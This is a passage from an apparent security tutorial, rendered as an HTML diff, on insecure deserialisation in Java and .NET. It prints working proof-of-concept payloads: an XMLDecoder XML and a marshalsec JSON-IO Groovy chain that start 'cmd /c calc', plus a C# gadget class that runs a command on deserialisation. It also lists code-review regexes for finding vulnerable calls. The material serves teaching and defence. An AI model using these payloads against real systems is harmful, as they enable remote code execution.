+<span class="kn">import</span> <span class="nn">java.io.BufferedInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DesertXML</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">XMLDecoder</span> <span class="n">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLDecoder</span><span class="o">(</span><span class="k">new</span> <span class="n">BufferedInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&quot;desert.xml&quot;</span><span class="o">)));</span>
+
+        <span class="c1">// Deserialise object from XML</span>
+        <span class="n">Object</span> <span class="n">desert</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="n">decoder</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The desert: &quot;</span> <span class="o">+</span> <span class="o">((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Has a surface of: &quot;</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getWidth</span><span class="o">()*((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getHeight</span><span class="o">())</span> <span class="o">);</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span>  <span class="nc">Desert</span> <span class="o">{</span>
+
+        <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="kt">int</span> <span class="n">width</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="kt">int</span> <span class="n">height</span><span class="o">;</span>
+
+        <span class="cm">/**</span>
+<span class="cm">         * Getters and Setters</span>
+<span class="cm">         */</span>
+        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getWidth</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">width</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setWidth</span><span class="o">(</span><span class="kt">int</span> <span class="n">width</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">width</span> <span class="o">=</span> <span class="n">width</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getHeight</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">height</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHeight</span><span class="o">(</span><span class="kt">int</span> <span class="n">height</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">height</span> <span class="o">=</span> <span class="n">height</span><span class="o">;</span>
+        <span class="o">}</span>    
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+
+<p>The application mainly try to instantiate the same object class we saw in the previous example, by loading it from an external XML file. Instead of an XML parsing routing, the <code>readObject()</code> is called from the <code>XMLDecoder</code> class.</p>
+<p>As we already know, the general concept behind deserialisation is to trick the application into loading arbitrary object, in a way we can use them to execute arbitrary code. So in this case, how can we exploit this situation to achieve RCE?</p>
+<p>The task is simple, we just need to tell the application to load well know classes used by java to interact with the OS, such as <code>java.lang.Runtime</code> or <code>java.lang.ProcessBuilder</code>. By using this classes, the application would kindly start new processes for us. An example payload would be the following:</p>
+<div class="codehilite"><pre><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">&quot;1.8.0_241&quot;</span> <span class="na">class=</span><span class="s">&quot;java.beans.XMLDecoder&quot;</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;void</span> <span class="na">class=</span><span class="s">&quot;java.lang.ProcessBuilder&quot;</span><span class="nt">&gt;</span>
+   <span class="nt">&lt;array</span> <span class="na">class=</span><span class="s">&quot;java.lang.String&quot;</span> <span class="na">length=</span><span class="s">&quot;3&quot;</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>cmd<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>/c<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;2&quot;</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;string&gt;</span>calc<span class="nt">&lt;/string&gt;</span>
+          <span class="nt">&lt;/void&gt;</span>
+      <span class="nt">&lt;/array&gt;</span>
+    <span class="nt">&lt;void</span> <span class="na">method=</span><span class="s">&quot;start&quot;</span> <span class="na">id=</span><span class="s">&quot;process&quot;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/void&gt;</span>
+  <span class="nt">&lt;/void&gt;</span>
+<span class="nt">&lt;/java&gt;</span>
+</pre></div>
+
+<p><strong>JSON</strong></p>
+<p>Of course, JSON format is not free from this kind of vulnerability. The main problem with JSON, however, is that quite a lot of libraries exist for JAVA which supports automatic serialization/deserialization. The one I will took as example is JsonIO. </p>
+<p>The code for the deserializer is following:</p>
+<p><div class="codehilite"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DesertJSON</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="c1">// Read JSON as a string</span>
+        <span class="n">String</span> <span class="n">json</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;desert.json&quot;</span><span class="o">)));</span>
+        <span class="c1">// Deserialising        </span>
+        <span class="n">Object</span> <span class="n">desert</span> <span class="o">=</span> <span class="n">JsonReader</span><span class="o">.</span><span class="na">jsonToJava</span><span class="o">(</span><span class="n">json</span><span class="o">);</span>
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The desert: &quot;</span> <span class="o">+</span> <span class="o">((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Has a surface of: &quot;</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getWidth</span><span class="o">()*((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getHeight</span><span class="o">())</span> <span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span>  <span class="nc">Desert</span> <span class="o">{</span>
+
+        <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="kt">int</span> <span class="n">width</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="kt">int</span> <span class="n">height</span><span class="o">;</span>
+
+        <span class="cm">/**</span>
+<span class="cm">         * Getters and Setters</span>
+<span class="cm">         */</span>
+        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getWidth</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">width</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setWidth</span><span class="o">(</span><span class="kt">int</span> <span class="n">width</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">width</span> <span class="o">=</span> <span class="n">width</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getHeight</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">height</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHeight</span><span class="o">(</span><span class="kt">int</span> <span class="n">height</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">height</span> <span class="o">=</span> <span class="n">height</span><span class="o">;</span>
+        <span class="o">}</span>    
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+JSON-IO allows to specify the type of the object to be deserialized within the JSON body, using the <code>@type</code> key. The concept is the same as the other type of deserialisation issues, we need just to find a POP chain to achieve RCE. </p>
+<p>In <a href="https://github.com/no-sec-marko/marshalsec/blob/master/marshalsec.pdf">this</a> research, M. Becheler, enumerates various JSON libraries and each method used for RCE exploitation. As part of the research, he provided an interesting tool, to automatically generates payloads for these libraries. For example, let&rsquo;s consider the following payload then:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.JsonIO Groovy <span class="s2">&quot;cmd&quot;</span> <span class="s2">&quot;/c&quot;</span> <span class="s2">&quot;calc&quot;</span>
+
+<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.Arrays</span><span class="nv">$ArrayList</span><span class="s2">&quot;</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@id&quot;</span>:2,<span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;groovy.util.Expando&quot;</span>,<span class="s2">&quot;expandoProperties&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.HashMap&quot;</span>,<span class="s2">&quot;hashCode&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>,<span class="s2">&quot;method&quot;</span>:<span class="s2">&quot;start&quot;</span>,<span class="s2">&quot;delegate&quot;</span>:<span class="o">{</span><span class="s2">&quot;@id&quot;</span>:1,<span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="s2">&quot;command&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.ArrayList&quot;</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[</span><span class="s2">&quot;cmd&quot;</span>,<span class="s2">&quot;/c&quot;</span>,<span class="s2">&quot;calc&quot;</span><span class="o">]}</span>,<span class="s2">&quot;directory&quot;</span>:null,<span class="s2">&quot;environment&quot;</span>:null,<span class="s2">&quot;redirectErrorStream&quot;</span>:false,<span class="s2">&quot;redirects&quot;</span>:null<span class="o">}</span>,<span class="s2">&quot;owner&quot;</span>:<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:1<span class="o">}</span>,<span class="s2">&quot;thisObject&quot;</span>:null,<span class="s2">&quot;resolveStrategy&quot;</span>:0,<span class="s2">&quot;directive&quot;</span>:0,<span class="s2">&quot;parameterTypes&quot;</span>:<span class="o">[]</span>,<span class="s2">&quot;maximumNumberOfParameters&quot;</span>:0,<span class="s2">&quot;bcw&quot;</span>:null<span class="o">}}}</span>,<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.HashMap&quot;</span>,<span class="s2">&quot;@keys&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}]</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}]}]}</span>
+</pre></div>
+
+<p><strong>Tips for Source Code reviewers</strong></p>
+<p>To find this kind of vulnerability it is usually enough to search the code for common regexes, like: </p>
+<ul>
+<li><code>.*readObject\(.*</code></li>
+<li><code>java.beans.XMLDecoder</code></li>
+<li><code>com.thoughtworks.xstream.XStream</code></li>
+<li><code>.*\.fromXML\(.*\)</code></li>
+<li><code>com.esotericsoftware.kryo.io.Input</code></li>
+<li><code>.readClassAndObject\(.*</code></li>
+<li><code>.readObjectOrNull\(.*</code></li>
+<li><code>com.caucho.hessian.io</code></li>
+<li><code>com.caucho.burlap.io.BurlapInput</code></li>
+<li><code>com.caucho.burlap.io.BurlapOutput</code></li>
+<li><code>org.codehaus.castor</code></li>
+<li><code>Unmarshaller</code></li>
+<li><code>jsonToJava\(.*</code></li>
+<li><code>JsonObjectsToJava\/.*</code></li>
+<li><code>JsonReader</code></li>
+<li><code>ObjectMapper\(</code></li>
+<li><code>enableDefaultTyping\(\s*\)</code></li>
+<li><code>@JsonTypeInfo\(</code></li>
+<li><code>readValue\(.*\,\s*Object\.class</code></li>
+<li><code>com.alibaba.fastjson.JSON</code></li>
+<li><code>JSON.parseObject</code></li>
+<li><code>com.owlike.genson.Genson</code></li>
+<li><code>useRuntimeType</code></li>
+<li><code>genson.deserialize</code></li>
+<li><code>org.red5.io</code></li>
+<li><code>deserialize\(.*\,\s*Object\.class</code></li>
+<li><code>\.Yaml</code></li>
+<li><code>\.load\(.*</code></li>
+<li><code>\.loadType\(.*\,\s*Object\.class</code></li>
+<li><code>YamlReader</code></li>
+<li><code>com.esotericsoftware.yamlbeans</code></li>
+</ul>
+<p>For each match, the code should be manually inspected to see whether the object read can be manipulated by an external attacker.</p>
+<p><strong>Additional Affected Libraries</strong></p>
+<p>As previously said, through the years, many other libraries had been found to be affected by this vulnerability. While exploring all of them is outside the bounds of this post, following a list of additional resource, which can be use to further explore this fascinating issue:</p>
+<ul>
+<li><a href="https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo-serialization">Kryo</a></li>
+<li><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">XStream</a></li>
+<li><a href="http://codewhitesec.blogspot.ru/2017/04/amf.html">AMF</a></li>
+<li><a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf">YAML and Other</a></li>
+</ul>
+<p>For additional references and a safe playground to exercise with this vulnerability, my friend and colleague <strong>Nick Bloor</strong> developed a fantastic vulnerable Lab, called <a href="https://github.com/NickstaDB/DeserLab">DeserLab</a>.</p>
+<h3 id="net">.NET<a class="headerlink" href="#net" title="Permanent link"></a></h3>
+<p>.NET, as JAVA, has developed over the years different mechanism to support object serialization. As Java, the primary archive formats are:</p>
+<ul>
+<li>Binary</li>
+<li>XML</li>
+<li>JSON</li>
+</ul>
+<h4 id="net-binary-archive-format">.NET: Binary Archive Format<a class="headerlink" href="#net-binary-archive-format" title="Permanent link"></a></h4>
+<p>In .NET, Binary serialization is mainly provided by <code>System.Runtime.Serialization.Binary.BinaryFormatter</code>. This class can virtually serialize ANY type which is marked as [Serializable] or which directly implements the ISerializable interface (allowing custom serialization).</p>
+<p>The following C# code can be used to serialize/deserialize the class Desert (similarly to the JAVA examples):</p>
+<div class="codehilite"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
+<span class="k">using</span>
+<span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
+<span class="k">namespace</span> <span class="nn">BinarySerialization</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">BinarySerialization</span>
+    <span class="p">{</span>
+        <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">&quot;desert.ser&quot;</span><span class="p">;</span>
+<span class="na">        [STAThread]</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
+
+            <span class="kt">bool</span> <span class="n">deserialize</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">deserialize</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertDeserial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="c1">// Delete old file, if it exists</span>
+                <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">deleteFile</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+                <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertSerial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Press Enter Key&quot;</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
+
+
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">deleteFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filname</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Deleting old file&quot;</span><span class="p">);</span>
+                <span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">desertDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+            <span class="c1">// Open stream for reading</span>
+            <span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">OpenRead</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Deserializing string&quot;</span><span class="p">);</span>
+            <span class="c1">// Deserializing</span>
+            <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="p">(</span><span class="n">Desert</span><span class="p">)</span><span class="n">formatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+            <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">desertSerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// Create desert name</span>
+            <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Desert</span><span class="p">();</span>
+            <span class="n">desert</span><span class="p">.</span><span class="n">name</span> <span class="p">=</span> <span class="s">&quot;Gobi&quot;</span><span class="p">;</span>
+            <span class="c1">// Persist to file</span>
+            <span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing desert&quot;</span><span class="p">);</span>
+            <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">desert</span><span class="p">);</span>
+            <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+
+<span class="na">    [Serializable]</span>
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
+    <span class="p">{</span>
+        <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
+        <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
+        <span class="p">{</span>
+            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
+            <span class="k">set</span>
+            <span class="p">{</span>
+                <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
+                <span class="n">run</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">private</span> <span class="k">void</span> <span class="nf">run</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">Run</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="na">    [Serializable]</span>
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">Desert</span>
+    <span class="p">{</span>
+        <span class="k">private</span> <span class="n">String</span> <span class="n">_name</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="n">String</span> <span class="n">name</span>
+        <span class="p">{</span>
+            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_name</span><span class="p">;</span> <span class="p">}</span>
+            <span class="k">set</span> <span class="p">{</span> <span class="n">_name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Desert name: &quot;</span> <span class="p">+</span> <span class="n">_name</span><span class="p">);</span> <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>If we run the serializer, the following object would be created:</p>
+<div class="codehilite"><pre>$ hexdump.exe -C desert.ser
+00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
+00000010  00 0c 02 00 00 00 49 42  61 73 69 63 58 4d 4c 53  |......IBasicXMLS|
+00000020  65 72 69 61 6c 69 7a 65  72 2c 20 56 65 72 73 69  |erializer, Versi|
+00000030  6f 6e 3d 31 2e 30 2e 30  2e 30 2c 20 43 75 6c 74  |on=1.0.0.0, Cult|
+00000040  75 72 65 3d 6e 65 75 74  72 61 6c 2c 20 50 75 62  |ure=neutral, Pub|
+00000050  6c 69 63 4b 65 79 54 6f  6b 65 6e 3d 6e 75 6c 6c  |licKeyToken=null|
+00000060  05 01 00 00 00 1a 42 69  6e 61 72 79 53 65 72 69  |......BinarySeri|
+00000070  61 6c 69 7a 61 74 69 6f  6e 2e 44 65 73 65 72 74  |alization.Desert|
+00000080  01 00 00 00 05 5f 6e 61  6d 65 01 02 00 00 00 06  |....._name......|
+00000090  03 00 00 00 04 47 6f 62  69 0b                    |.....Gobi.|
+0000009a
+</pre></div>
+
+<p>The first 17 bytes are the header of the deserialized object, which consists of:</p>
+<ul>
+<li>RecordTypeEnum (1 byte)</li>
+<li>RootId (4 bytes)</li>
+<li>HeaderId (4 bytes)</li>
+<li>MajorVersion (4 bytes)</li>
+<li>MinorVersion (4 bytes)</li>
+</ul>
+<p>How we can exploit this kind of behavior then?</p>
+<p>Well, the approach is very similar to the one applied to JAVA, and consists to trick the application into loading an arbitrary object, that could allow us to gain code execution capabilities. In order to do it, we should find a suitable class, which, if you rememeber, should have at least the following properties (NW: it&rsquo;s not a formal definition):</p>
+<ul>
+<li>Serializable</li>
+<li>Holding public/settable variables</li>
+<li>Implementing magic &ldquo;functions&rdquo; (we&rsquo;ll see an example below), like:<ul>
+<li>Get/Set</li>
+<li>OnSerialisation</li>
+<li>Hash</li>
+</ul>
+</li>
+</ul>
+<p>Now, if you take a deeper look at the code above, you&rsquo;ll find this class:</p>
+<div class="codehilite"><pre><span class="na"> [Serializable]</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
+    <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
+    <span class="p">{</span>
+        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">set</span>
+        <span class="p">{</span>
+            <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
+            <span class="n">Run</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">void</span> <span class="nf">Run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">Run</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>This class seems suitable for our needs, it can be considered as it&rsquo;s a valid <strong>Gadget</strong>, as even alone it can allow us to reach remote code execution. In order to achieve it, it would be enough for an attacker to serialize the RCE class giving a valid command to execute: </p>
+<div class="codehilite"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
+<span class="k">using</span>
+<span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
